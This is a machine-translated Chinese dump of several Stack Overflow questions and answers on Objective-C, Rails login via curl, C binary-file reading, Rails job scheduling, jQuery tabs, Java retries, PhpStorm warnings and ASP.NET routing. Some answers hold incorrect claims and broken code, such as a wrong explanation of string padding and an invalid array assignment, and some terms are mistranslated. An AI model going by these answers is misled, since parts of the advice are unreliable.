不，没有这样的方法。 `init`来自`NSObject`所以每个对象都可以使用它，并且子类也定义了自己的初始化方法。 `UIView`，例如，定义`initWithFrame:`，此外还有来自协议的 init 方法，例如`NSCoding`which defined `initWithCoder:`。这就是 Objective-C 的动态特性，任何东西都可以随时扩展。话虽如此，有一些模式。 `UIViewController`几乎总是取`initWithNibName:bundle:`并且`UIView`几乎总是取`initWithFrame:`or `initWithCoder:`。我所做的是创建一个内部初始化方法，然后让其他初始化方法调用它。

```
- (void)initialize
{
    //Do stuff
}

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if(self)
    {
        [self initialize];
    }
}

- (id)initWithCoder:(NSCoder *)aCoder
{
    self = [super initWithCoder:aCoder];
    if(self)
    {
        [self initialize];
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-04T15:05:33.393

不是 100% 肯定它总是被调用，但我很确定这是一个可行的选择。老实说，我不记得我曾在实践中看到过这种方法，而且我通常会回避使用这种方法（我完全不知道为什么，可能是因为它不是最干净和最全面的实现方法这个...）：

```
-didMoveToSuperview() 
```

从文档：

> 告诉视图其超级视图已更改。此方法的默认实现什么也不做。每当父视图更改时，子类可以覆盖它以执行其他操作。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-01T23:35:07.257

有很多方法可以编写自定义初始化程序。

```
- (id)initWithString:(NSString *)string {
    if((self == [super init])) {
        self.string = string;
    }
    return self;
} 
```

这就是我编写初始化程序的一般方式。例如，上面的那个需要一个字符串。（如果你不想，你不必传递字符串）。

顺便说一句，init 是一种方法。根据 NSObject 的标头，init 有一个方法实现。

# objective-c - Rails 3 教程 cURL/iOS 登录

> ID：11751322
> 
> 赞同：0
> 
> 时间：2012-08-01T01:19:38.513
> 
> 标签：objective-c, ruby-on-rails, ios5, curl

我使用了 Michael Hartl 的 Rails 3 Tutorial 应用程序，并在几个方面对其进行了扩展。但是，我保持登录和会话处理相同。我想与 iphone 应用程序交互，但不知道如何。我看过 RestKit 和 Objective Resource，但我想我会自己动手。我一直在用 cURL 对其进行测试，但到目前为止还没有运气。我一直在使用这个命令

```
curl -H 'Content-Type: application/json'   -H 'Accept: application/json'   -X POST http://www.example.com/signin   -d "{'session' : { 'email' : 'email@gmail.com', 'password' : 'pwd'}}"   -c cookie 
```

正如在 Rails 3 教程中一样，我使用的是 Sessions。

这些是路线：

```
match '/signin', :to => 'sessions#new'
match '/signout', :to => 'sessions#destroy' 
```

这是控制器：

```
class SessionsController < ApplicationController
def new
@title = "Sign in"
end

def create
user = User.authenticate(params[:session][:email],
                         params[:session][:password])
if user.nil?
    flash.now[:error] = "Invalid email/password combination."
    @title = "Sign in"
    render 'new'
else
    sign_in user
    redirect_back_or user
end
end

def destroy
sign_out
redirect_to root_path
end
end 
```

没有模型，您使用表格登录。这是表单的html：

```
<h1>Sign In</h1>
<%= form_for(:session, :url => sessions_path) do |f| %>
<div class="field">
<%= f.label :email %></br>
<%= f.text_field :email %>
</div>
<div class="field">
<%= f.label :password %></br>
<%= f.password_field :password %>
</div>
<div class="actions">
<%= f.submit "Sign in" %>
</div>
<% end %>

<p> New user? <%= link_to "Sign up now!", signup_path %></p> 
```

抱歉，如果信息太多，我想尽可能多地提供。

基本上，我希望能够从原生 iphone 应用程序访问我的 Rails 数据库。如果有人对如何登录、存储会话以及对网站进行其他调用有很好的建议，我将不胜感激。

但是，如果这是不可能的，一个有效的 cURL 请求可能会让我朝着正确的方向前进。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:38:29.083

我面临着类似的情况，这导致我起草了这个 stackoverflow 帖子：

```
[http://stackoverflow.com/questions/7997009/rails-3-basic-http-authentication-vs-authentication-token-with-iphone][1] 
```

基本上，您可以使用带有 rails 的基本 http 身份验证来简化事情。

这是控制器的示例：

```
 class PagesController < ApplicationController  

  def login
    respond_to do |format|
      format.json {
        if params[:user] and
           params[:user][:email] and
           params[:user][:password]
          @user = User.find_by_email(params[:user][:email])
          if @user.valid_password?(params[:user][:password])
            @user.ensure_authentication_token!
            respond_to do |format|
              format.json {
                render :json => {
                    :success => true,
                    :user_id => @user.id,
                    :email => @user.email
                  }.to_json
              }
            end
          else
            render :json => {:error => "Invalid login email/password.", :status => 401}.to_json
          end
        else
          render :json => {:error => "Please include email and password parameters.", :status => 401}.to_json
        end
      }
    end
  end 
```

然后在 iphone/objective-c 方面，您可以使用 ASIHTTPRequest 库和 JSONKit 库：

```
http://allseeing-i.com/ASIHTTPRequest/

https://github.com/johnezang/JSONKit/ 
```

一旦你在 xcode 中安装了所有上述内容，然后访问 rails 控制器，以 json 格式获取响应，并在 objective-c 中处理它很简单：

```
NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@/pages/login.json", RemoteUrl]];
ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:url];
[request addRequestHeader:@"Content-Type" value:@"application/json"];
[request setRequestMethod:@"POST"];
[request appendPostData:[[NSString stringWithFormat:@"{\"user\":{\"email\":\"%@\", \"password\":\"%@\"}}", self.emailField.text, self.passwordField.text] dataUsingEncoding:NSUTF8StringEncoding] ];
[request startSynchronous];

//start
[self.loginIndicator startAnimating];

//finish
 NSError *error = [request error];
[self setLoginStatus:@"" isLoading:NO];

if (error) {
    [self setLoginStatus:@"Error" isLoading:NO];
    [self showAlert:[error description]];
} else {
    NSString *response = [request responseString];

    NSDictionary * resultsDictionary = [response objectFromJSONString];

    NSString * success = [resultsDictionary objectForKey:@"success"];

    if ([success boolValue]) {
        .... 
```

我刚刚完成了一个带有大量 Rails 调用的 rails/iphone 应用程序，所以它绝对是可行的并且是一种学习体验。

# c - 这个算法不起作用

> ID：11751324
> 
> 赞同：2
> 
> 时间：2012-08-01T01:19:53.817
> 
> 标签：c, data-structures, binaryfiles

当我将数据写入文件然后读取它们时，我创建了一个包含三个人（代号-名称-性别）的二进制文件，它工作得很好，所以..

我希望下一个函数读取 X 人的所有信息（如果存在）。

句法：

```
#include <stdio.h>    

struct alu{
    int cod;
    char name[30]; //alu[0]="juan" alu[1]="pedro" alu[2]="leo"
    int sex;
};

int FSearch(char path[],char X[]) {
    char Name[30];

    FILE *arc;
    arc=fopen(path,"rb");
    fseek(arc,sizeof(int),SEEK_SET);

    while (fread(Name,sizeof(char[30]),1,arc)) {
        /*Here is when the errors happen..
        The next sentence tell me that A.name don't have 
        the name from the second time*/
        printf("%s and %s.",X,Name);

        if (strcmp(Name,X)==0) return 1;
        fseek(arc,2*sizeof(int),SEEK_CUR);
    }
    fclose(arc);

    return 0
}

int main(int argc, char **argv)
{
    char path[]="file.bin";

    printf("\n%d",FSearch(path,"pedro"));

    return 0;
} 
```

* * *

输出如下：

> pedro 和 juan.pedro 和 .pedro 和 .
> 
> 0

这意味着找到第一个名字（'juan'）但第二个和第三个不是（pedro 和 leo）。

**怎么了？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T19:42:24.987

## 事情是这样的：

```
fseek(arc,sizeof(int),SEEK_SET);

while (fread(Name,sizeof(char[30]),1,arc)) {        
    if (strcmp(A.name,X)==0) return 1;
    fseek(arc,2*sizeof(int),SEEK_CUR); //--> ERROR
} 
```

## 应该是这样的：

```
fseek(arc,sizeof(int),SEEK_SET);

while (fread(Name,sizeof(char[30]),1,arc)) {        
    if (strcmp(A.name,X)==0) return 1;
    fseek(arc,2*sizeof(int)+sizeof(char[2]),SEEK_CUR); //--> SOLVED
} 
```

问题是第二个参数，即*从原点偏移的字节数*`fseek()`，在 while 循环中传递给调用。它计算了两个 INT，但没有计算两个 CHAR（在到达第二个字符串之前）。你可以看到调用`sizeof(char[30])`之后`fread()`，它显示了 32 个字节，但是 30 个字节分配给了字符串。

为什么还要再移动两个字节？因为任何字符串的末尾都有保留字节（用于指示字符串的开头和结尾）。例如：

```
char a[10]="Example"; 
```

如果将其保存到二进制文件中，则该文件的大小为 12 个字节。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:32:54.483

`fread`每次通过循环时，我都会打印调用结果。我敢打赌，在您在文件上击中 EOF 的第一个对象之后。我的预测是第一个`fread`调用返回 1，其他调用返回 0。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:08:30.220

我不知道你的二进制文件格式。您的代码告诉二进制文件的名称只有 30 个字符。

```
 struct alu{
        int cod;
        char name[30]; //juan - pedro - leo
        int sex;
    }; 
```

此结构大小不是 38 字节。

检查结构尺寸。

```
printf("%d", sizeof(struct alu)); 
```

结构大小取决于您的编译器选项...

如果您的二进制格式具有以下格式。

```
{ // 1st record
  cod = 10
  names[30] = "juan"
  sex = 1
}
{ // 2nd record
  cod = 20
  names[30] = "pedro"
  sex = 1
}
{ // 3rd record
  cod = 12
  names[30] = "leo"
  sex = 2
} 
```

查看您的代码。

```
#include <stdio.h>    

#pragma pack(push, 1) or 4 or 8 depend on your binary format.
    struct alu{
        int cod;
        char name[30]; //juan - pedro - leo
        int sex;
    };
#pragma pack(pop)

int FSearch(char path[],char X[]) {
    char Name[30];
    struct alu A;

    FILE *arc;
    arc=fopen(path,"rb");
    //fseek(arc,sizeof(char[30]),SEEK_SET);
    fseek(arc,0,SEEK_SET); // first record.

    //while (fread(Name,sizeof(char[30]),1,arc)) {
    while (fread(A,sizeof(A),1,arc)) {
        /*Here is when the errors happen..
        The next sentence tell me that A.name don't have 
        the name from the second time*/
        printf("%s and %s.",X,A.name);

        if (strcmp(A.name,X)==0) {
            printf("Information of %s:\n",X);
            //fshow_str(A);
            fclose(arc);
            return 1; // found
        }
    }
    fclose(arc);
    return 0; // not found
}

int main(int argc, char **argv)
{
    char path[]="file.bin";

    printf("\n%d",FSearch(path,"pedro"));

    return 0;
} 
```

* * *

鳕鱼大小取决于编译器选项！！！

```
int FSearch(char path[],char X[]) {
    char Name[30];
    struct alu A;

    FILE *arc;
    arc=fopen(path,"rb");
    fseek(arc,0,SEEK_SET); // first record.

    //while (fread(Name,sizeof(char[30]),1,arc)) {
    while (1) {
        //if ( -1 == fseek(arc,4,SEEK_CUR)) // Important!!! case structure pack(4) for skip cod or
        //    break;
        if ( -1 == fseek(arc,8,SEEK_CUR)) // Important!!! case structure pack(8) for skip cod
            break;

        if (!fread(Name,sizeof(Name),1,arc))
            break;

        A.name = Name;

        /*Here is when the errors happen..
        The next sentence tell me that A.name don't have 
        the name from the second time*/
        printf("%s and %s.",X,A.name);

        if (strcmp(A.name,X)==0) {
            printf("Information of %s:\n",X);
            //fshow_str(A);
            fclose(arc);
            return 1; // found
        }
    }

        //if ( -1 == fseek(arc,4,SEEK_CUR)) // Important!!! case structure pack(4) for skip sex or
        //    break;
        if ( -1 == fseek(arc,8,SEEK_CUR)) // Important!!! case structure pack(8) for skip sex
            break;

    fclose(arc);
    return 0; // not found
} 
```

* * *

二进制文件和结构用 4 个字节排列。

```
// Attention! pragma pack(push, 4) needs!!!
// Your now running machine is 32 bits system.
// This source code will invoke addressing fault 64 bits NON Intel processor.
#pragma pack(push, 4) // align 4 bytes.
    struct alu{
        int cod; // Integer type. 4 bytes on 32bits system. but 8 bytes on 64 bits system. 
                 // I recommend using "long" type. "long" type is 4 bytes on any system.
        char name[30]; //juan - pedro - leo
        int sex; // also, Integer type.
    };
#pragma pack(pop)

int FSearch(char path[],char X[]) {
    char Name[30];
    struct alu A;

    FILE *arc;
    arc=fopen(path,"rb");
    fseek(arc,0,SEEK_SET); // first record.

    //while (fread(Name,sizeof(char[30]),1,arc)) {
    while (1) {
        if ( -1 == fseek(arc,4,SEEK_CUR)) // Skip "cod" 4 bytes.
            break;
        if (!fread(Name,sizeof(Name),1,arc)) // Read "name" 30 bytes.
            break;
        if ( -1 == fseek(arc,2,SEEK_CUR)) // Skip "name"'s aligned 2 bytes.
            break;

        A.name = Name;

        /*Here is when the errors happen..
        The next sentence tell me that A.name don't have 
        the name from the second time*/
        printf("%s and %s.",X,A.name);

        if (strcmp(A.name,X)==0) {
            printf("Information of %s:\n",X);
            //fshow_str(A);
            fclose(arc);
            return 1; // found
        }
    }

    if ( -1 == fseek(arc,4,SEEK_CUR)) // Skip "sex" 4 bytes.
       break;

    fclose(arc);
    return 0; // not found
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-01T01:23:37.263

`printf`在`main()`打印的**返回值**中`FSearch()`，如果要查看是否找到结果，至少应该返回一个布尔值`FSearch()`

# ruby-on-rails - Rails 后台进程（Heroku Rails 3+）

> ID：11751325
> 
> 赞同：3
> 
> 时间：2012-08-01T01:20:09.633
> 
> 标签：ruby-on-rails, ruby, linux, heroku, rake

我将为我的 Rails 3.2.3 和 Heroku 应用程序设置一些功能。这个想法是每天运行一个任务或作业（或任何你想调用的），以确保来自外部 API 的用户信息与我的数据库中的用户信息是最新的。我很好奇设置它的最佳方法是什么？它应该是运行 rake 任务的 cron 作业吗？

似乎有很多方法可以做到这一点，我对其他人这样做的方式很感兴趣。我能想到的唯一方法是在 cron 作业中运行 rake 任务，但很想弄清楚最佳实践是什么，或者最简单的方法。似乎有很多方法可以给这只猫剥皮……还有很多不同的工具。

如果有一种纯粹的 rails 方法可以做到这一点，我认为那会更好，这样我就不必在我放置应用程序的每个系统上搞砸了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T13:40:06.393

对于每天运行一次的简单同步作业，我相信拥有一个**cronjob**就足够了，而且从长远来看可能更稳定。

老实说，在我看来，诸如 Resque 和 Sidekiq 之类的解决方案有点矫枉过正（根据您的需要）。您仍然需要使用调度程序向这些系统发送消息。

如果您希望更轻松地部署和编写 crontabs，请查看 gem ' **whenever '：** [https ://github.com/javan/whenever/](https://github.com/javan/whenever/)

Railscasts 关于“无论何时”：[http ://railscasts.com/episodes/164-cron-in-ruby](http://railscasts.com/episodes/164-cron-in-ruby)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T01:36:12.007

有两种选择。它们比您在问题中提到的选项更好

1.  [回复](https://github.com/defunkt/resque/)_
2.  [西德基克](http://mperham.github.com/sidekiq/)。

试试后一种。它更快、更轻量并且基于多线程，因此不会干扰系统。您需要查看两个 gem 的调度程序以便每天进行处理。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T06:59:38.263

使用[Heroku 调度程序](https://addons.heroku.com/scheduler "Heroku 调度程序插件")添加到句柄调度本身。您可以让它运行 rake 任务、resque 或其他任何东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-01T06:39:36.900

这里有一些可供选择：

1.  [resque](https://github.com/defunkt/resque/)（使用[resque-scheduler](https://github.com/bvandenbos/resque-scheduler/)。但你必须使用 redis ）
2.  [rufus-scheduler](http://rufus.rubyforge.org/rufus-scheduler/)（如果你想要一些简单的东西，resque 使用 rufus-scheduler 本身）
3.  您可以尝试使用类似[这样的一些技巧来](http://terrbear.org/2010/02/19/scheduling-jobs-with-delayedjob/ "关联")[延迟作业](https://github.com/collectiveidea/delayed_job)。不太适合调度，但可以使用您的应用程序数据库。

# jquery - jQuery fadeIn() 跳转到页面顶部

> ID：11751326
> 
> 赞同：0
> 
> 时间：2012-08-01T01:20:10.180
> 
> 标签：jquery

我有自定义 jQuery 选项卡（不是 UI），效果很好。但是，由于选项卡使用`fadeIn()`，当您单击不同的选项卡时，它会跳转到页面顶部。

我已经查看了这两个解决方案（如下），似乎设置**高度**确实解决了跳跃问题。但是，我不想静态设置高度。我试图动态设置高度，但由于某种原因我无法使其工作。我也尝试加载内容 ( `load()`) 但也无法使其正常工作。

[jQuery淡入淡出制作页面跳转](https://stackoverflow.com/questions/3574508/jquery-fade-making-page-jump)

[加载新图像时单击跳转时的JQuery淡入/淡出图像](https://stackoverflow.com/questions/3832723/jquery-fadein-fadeout-image-on-click-jumps-while-loading-new-image)

我的**HTML**代码是这样的：

```
<ul class="port-tabs">
<li><a href="#tab1">Web Design &amp; Dev</a></li>
<li><a href="#tab2">Graphic Design</a></li>
<li><a href="#tab3">Photography</a></li>
</ul>

<div class="port-slides slides-list tab-container">
<div id="tab1" class="port-subpages tab-content">
    <ul class="portfolio">
  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><img src="http://localhost:8888/wordpress/wp-content/uploads/2012/07/port-image1.jpg" alt="" title="" width="223" height="225" class="alignnone size-full wp-image-112" /></a>
</div>
  </li>
  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><img src="http://localhost:8888/wordpress/wp-content/uploads/2012/07/port-image2.jpg" alt="" title="" width="223" height="225" class="alignnone size-full wp-image-112" /></a>
</div>
  </li>
  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><img src="http://localhost:8888/wordpress/wp-content/uploads/2012/07/port-image3.jpg" alt="" title="" width="223" height="225" class="alignnone size-full wp-image-112" /></a>
</div>
  </li>

  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><span class="port-just-text">TEXT PLACEHOLDER 1</span></a>
</div>
  </li>
  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><span class="port-just-text">TEXT PLACEHOLDER 2</a>
</div>
  </li>
  <li>
<div id="port-window">
    <span class="window"></span>
    <span class="gradient"></span>
    <a href="#"><span class="port-just-text">TEXT PLACEHOLDER 3</a>
</div>
  </li>
</ul>
</div>
<p class="clearBoth"></p> <!-- Temporary fix: remove when live -->
<div id="tab3" class="port-subpages tab-content">
    <p>Tab Content 3</p>
</div> 
```

**jQuery**代码是这样的：

```
$(document).ready(function() {

    //When page loads...
    $(".tab-content").hide(); //Hide all content
    $("ul.port-tabs li:first").addClass("active").show(); //Activate first tab
    $(".tab-content:first").show(); //Show first tab content

    //On Click Event
    $("ul.port-tabs li").click(function() {

        $("ul.port-tabs li").removeClass("active"); //Remove any "active" class
        $(this).addClass("active"); //Add "active" class to selected tab
        $(".tab-content").hide(); //Hide all tab content

        var activeTab = $(this).find("a").attr("href"); //Find the href attribute value to identify the active tab + content
        //activeHeight = $(activeTab).height();
        //alert(activeHeight);
        $(activeTab).fadeIn(); //Fade in the active ID content
        return false;
    });
}); 
```

有人可以帮助消除单击新标签时跳到顶部的问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:32:51.623

我相信这是因为您的锚标签而发生的。尝试添加这些行

```
 $("ul.port-tabs li").click(function(e) {
  e.preventDefault();
  e.stopPropagation(); 
```

# sql - 存储简单正则表达式的有效方法

> ID：11751327
> 
> 赞同：2
> 
> 时间：2012-08-01T01:20:37.493
> 
> 标签：sql, regex, database, data-structures

我有一个简单的正则表达式列表：

```
ABC.+DE.+FHIJ.+
.+XY.+Z.+AB
.+KLM.+NO.+J.+
QRST.+UV 
```

它们都有 .+ 的交替模式，并且某些文本（我将称之为“单词”）重复了若干次。模式可能以 .+ 开头或结尾，也可能不以 .+ 结尾。这些正则表达式都是互斥的。添加另一个正则表达式时，我想删除任何其他匹配的正则表达式，并添加一个正则表达式，将添加的正则表达式与其所有匹配项结合起来。例如，添加：

```
.+J.+ 
```

会匹配，

```
ABC.+DE.+FHIJ.+
.+KLM.+NO.+J.+ 
```

因此，这些将被删除并替换为添加的正则表达式，从而导致：

```
.+J.+ 
.+XY.+Z.+AB
QRST.+UV 
```

我需要以某种数据结构或（最好）以有效的方式将这些模式存储在数据库中。我首先尝试了一个字典树，只是意识到在正则表达式以 .* 开头的情况下，它必须在整个树中搜索下一个单词，即 O(2^n) 的顺序。不幸的是，（除非我弄错了）似乎 SQLite（我正在使用）和我使用过的任何其他关系数据库都不支持“正则表达式”作为数据类型。我的问题是，有没有一种有效的方法来存储和检索这种简单的正则表达式？如果没有固定方法，是否存在一些相对有效的数据结构（例如，在最坏的摊销多项式时间）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:26:31.803

您能否解释一下您使用这些正则表达式的目的，因为这样可以更容易地提供更好的答案？特别是当我看到您拆分正则表达式的方式时，我想知道[Trie](http://en.wikipedia.org/wiki/Trie)或有向[无环词图](http://en.wikipedia.org/wiki/Directed_acyclic_word_graph)是否更合适。

从他们那里您可能会发现您的答案很简单，就像提供更好的规范化或找到专门为您的问题领域制作的替代无 SQL 数据库一样简单。

# java - Java 执行具有多次重试和超时的任务

> ID：11751329
> 
> 赞同：8
> 
> 时间：2012-08-01T01:21:15.937
> 
> 标签：java, timeout

我正在尝试创建一种在最长时间内执行给定任务的方法。如果未能在该时间内完成，则应在放弃之前重试多次。它还应该在每次尝试之间等待几秒钟。这是我想出的，我想对我的方法提出一些批评。他们是使用 的更简单的方法`ScheduledExecutorService`还是我的方法就足够了？

```
public static <T> T execute(Callable<T> task, int tries, int waitTimeSeconds, int timeout) 
    throws InterruptedException, TimeoutException, Exception {

    Exception lastThrown = null;
    for (int i = 0; i < tries; i++) {
        try {
            final Future<T> future = new FutureTask<T>(task);
            return future.get(timeout, TimeUnit.SECONDS);
        } catch (TimeoutException ex) {
            lastThrown = ex;
        } catch (ExecutionException ex) {
            lastThrown = (Exception) ex.getCause();
        }
        Thread.sleep(TimeUnit.SECONDS.toMillis(waitTimeSeconds));
    }
    if (lastThrown == null) {
        lastThrown = new TimeoutException("Reached max tries without being caused by some exception. " + task.getClass());
    }
    throw lastThrown;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T02:16:01.620

我认为，但我认为，如果您正在调度与网络相关的任务，则不应重试，而应最终并行运行它们。我稍后会描述这种另一种方法。

关于您的代码，您应该将任务传递给执行程序，或将 FutureTask 传递给线程。它不会产生线程或自行执行。如果你有一个 executor（见 ExecutorService），你甚至不需要 FutureTask，你可以简单地调度它并获得一个 callable。

所以，假设你有一个 ExecutorService，你可以调用：

```
Future<T> future = yourExecutor.submit(task); 
```

Future.get(timeout) 将等待该超时并最终返回 TimeoutException，即使任务根本没有开始，例如，如果 Executor 已经忙于做其他工作并且找不到空闲线程。因此，您最终可能会尝试 5 次并等待几秒钟，而不会给任务运行机会。这可能是也可能不是您所期望的，但通常并非如此。也许您应该等待它启动，然后再给它一个超时。

此外，即使 Future 抛出 TimeoutException，您也应该显式取消它，否则它可能会继续运行，因为文档和代码都没有说明当 get 超时失败时它会停止。

即使您取消它，除非 Callable 已“正确编写”，否则它可能会继续运行一段时间。在这部分代码中您无能为力，请记住，没有线程可以“真正停止”另一个线程在 Java 中所做的事情，并且有充分的理由。

但是我认为您的任务主要与网络相关，因此它应该对线程中断做出正确反应。

我通常使用不同的策略是这样的情况：

1.  我会写 public static T execute(Callable task, int maxTries, int timeout)，所以任务，最大尝试次数（可能为 1），最大总超时（“我想在最多 10 秒内得到答案，不管多少次你试试，10 秒或什么都没有”）
2.  我开始生成任务，将其交给执行者，然后调用 future.get(timeout/tries)
3.  如果我收到结果，请将其返回。如果我收到异常，将重试（见下文）
4.  但是，如果我超时，我不会取消未来，而是将其保存在列表中。
5.  我检查是否已经过去了太多时间，或者是否有太多重试。在那种情况下，我取消列表中的所有期货并抛出异常，返回 null，无论如何
6.  否则，我循环，再次安排任务（与第一个并行）。
7.  见第 2 点
8.  如果我没有收到结果，我会检查列表中的未来，也许之前生成的任务之一设法做到了。

假设您的任务可以多次执行（我想它们是，否则无法重试），对于网络内容，我发现此解决方案效果更好。

假设您的网络实际上非常繁忙，您请求网络连接，每次 2 秒重试 20 次。由于您的网络繁忙，20 次重试都无法在 2 秒内获得连接。但是，持续 40 秒的单次执行可能会设法连接和接收数据。这就像一个人在网速很慢的时候在一个页面上强制按f5，它不会有任何好处，因为每次浏览器都必须从头开始。

相反，我保持各种期货运行，第一个设法获取数据的期货将返回结果，其他期货将停止。如果第一个挂起，则第二个将起作用，或者第三个可能会起作用。

与浏览器相比，就像打开另一个选项卡并在不关闭第一个选项卡的情况下重试加载页面一样。如果网络很慢，第二个将需要一些时间，但不会停止第一个，最终会正确加载。相反，如果第一个选项卡被挂起，第二个选项卡将快速加载。无论哪个先加载，我们都可以关闭另一个选项卡。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T06:14:02.217

调用你的线程`execute`将阻塞这么长时间。不确定这是否适合您。基本上，对于这些类型的任务，`ScheduledExecutorService`是最好的。您可以安排任务并指定时间。看看[ScheduledThreadPoolExecutor](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ScheduledThreadPoolExecutor.html "ScheduledThreadPoolExecutor")

# php - PhpStorm 警告 PHP 变量可能尚未定义

> ID：11751330
> 
> 赞同：6
> 
> 时间：2012-08-01T01:21:16.103
> 
> 标签：php, phpstorm

考虑：

```
<?php
  //  $smith = "";
  $submit ="button_a";

  if($submit == "button_a") {
      $smith = "button_a";
  }
    elseif($submit == "button_b"){
      $smith = "button_b";
  }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
</head>

<body>
    <p>
        <?php echo($smith);  ?>
    </p>
</body>

</html> 
```

PhpStorm 为每个文件提供一个标志：红色 - 错误，黄色 - 警告，绿色 - 正常。

标头上方的 PHP 代码将为*$smith*分配一个值。在正文中，我收到关于 $smith 的警告，说它可能未定义。如果我在 PHP 代码的顶部声明所有变量 ($smith = "";) 它很高兴（没有警告）。

我应该做些什么来防止这些警告吗？

我不喜欢将评论附加到每个说不检查它的想法，我不想将它们全部关闭。

当我包含定义四个或五个变量的*db_login.php文件时，这种情况经常发生。*[对于WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#Variants)、[MAMP](https://en.wikipedia.org/wiki/MAMP)和真正的软管，我有不同的*db_login.php*文件。

有什么想法吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-01T01:28:39.493

*如果 include 语句的require*位于变量访问之前的同一执行流中，您可以告诉 PhpStorm 忽略未定义的变量报告。

您会在*“未定义变量”中找到它 - 忽略“包含”和“要求”语句*。它默认启用，因此您应该禁用它。

![在此处输入图像描述](../Images/6b05fb872b847a1d6394e8618159256e.png)

*注意：设置在菜单*File* → *Settings* ( `Ctrl`+ `Alt`+ `S`) → *Project Settings* → *Inspections* → *PHP* → *Undefined* → *Undefined variable*

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-01T01:23:37.613

是的，你可以做两件事来摆脱这个警告。你说的：

```
$smith = "";
if($submit == "button_a") {
    $smith = "button_a";
}
elseif($submit == "button_b"){
    $smith = "button_b";
} 
```

或者在打印时检查它是否已设置：

```
<?php
    if( isset( $smith)) {
        echo($smith);
    }
?> 
```

但是，这只是一个警告，它让您知道存在一个`$smith`未定义的条件（when `$submit`is not`"button_a"`和 is not `"button_b"`）。如果发生这种情况，您将在`$smith`未设置时打印，这可能是您的脚本中的错误。

# objective-c - 与 sortUsingSelector 混淆

> ID：11751340
> 
> 赞同：1
> 
> 时间：2012-08-01T01:22:12.847
> 
> 标签：objective-c, sorting

当这本书开始讨论使用`sort`and`compareNames:`方法对数组中的元素进行字母排序时，我有些困惑。`compareNames`调用方法时如何获取参数`sort`？当所有返回的都是 类型时，元素实际上是如何按字母顺序排列的`NSComparisonResult`？

```
#import <Foundation/Foundation.h>

@interface AddressCard : NSObject
@property (copy, nonatomic) NSString *name, *email;

-(NSComparisonResult) compareNames: (id) element;

@end

@implementation AddressCard 
@synthesize name, email;

-(NSComparisonResult) compareNames:(id)element {
    return [name compare: [element name]];
}
@end 
```

* * *

```
#import "AddressCard.h"
#import <Foundation/Foundation.h>

@interface AddressBook : NSObject
@property (nonatomic, copy) NSString *bookName;
@property (nonatomic, strong) NSMutableArray *book;

-(void) addCard: (AddressCard *) myCard;
-(void) sort;

@end

@implementation AddressBook
@synthesize book, bookName;

-(void) sort {
    [book sortUsingSelector: @selector(compareNames:)];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:31:15.857

A`NSComparisonResult`只是`NSOrderedAscending`, `NSOrderedSame`, 中的一个`NSOrderedDescending`。

该方法`compareNames`负责真正的比较。在这种情况下，由于您正在比较字符串，因此该方法仅依赖于已实现`compare`的`NSString`. 结果根据字母顺序提供有关两个字符串之间比较的信息。

方法`sortUsingSelector`是`NSMutableArray`对自定义类型的数据进行排序的有用方法（如果您尝试根据自定义条件对自定义对象进行排序，您会更好地理解）。它接受一个选择器，这意味着每次需要比较两个对象时，都会调用选择器指定的方法。

我记得你不允许知道`sortUsingSelector`内部使用的方法（快速排序/堆排序/冒泡排序......），你需要知道的是对象是使用你传递的方法的实现指定的标准排序的与选择器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:34:03.737

`compareNames:`排序方法 ( `sortUsingSelector:`) 对需要比较的每一对元素重复调用该方法；它提供论据。确切地比较哪些元素对来对数组进行排序取决于排序算法。Apple 文档没有提及使用哪种方法，但[QuickSort](http://en.wikipedia.org/wiki/Quicksort)是一种相当常见的方法。如果您查看 Wikipedia 页面，您应该能够看到如何通过重复比较成对的项目来最终得到完整的排序数组。

# asp.net-mvc - 尝试使用“routes.MapRoute”缩短路线，但出现错误“找不到资源”。

> ID：11751347
> 
> 赞同：0
> 
> 时间：2012-08-01T01:23:15.663
> 
> 标签：asp.net-mvc, resources, asp.net-mvc-routing

现在我正在使用以下路线：

```
http://localhost/Ancora/MiniSites/Index/Lilly 
```

我正在尝试缩短为：

```
http://LocalHost/Ancora/Lilly 
```

通过使用 Global.asax.cs 中的下一个代码：

```
public static void RegisterRoutes(RouteCollection routes)
{
    routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

    routes.MapRoute(
        "MiniSite",
        "{code}",
        new { controller = "MiniSites", action = "Index", code = "" },
    );
} 
```

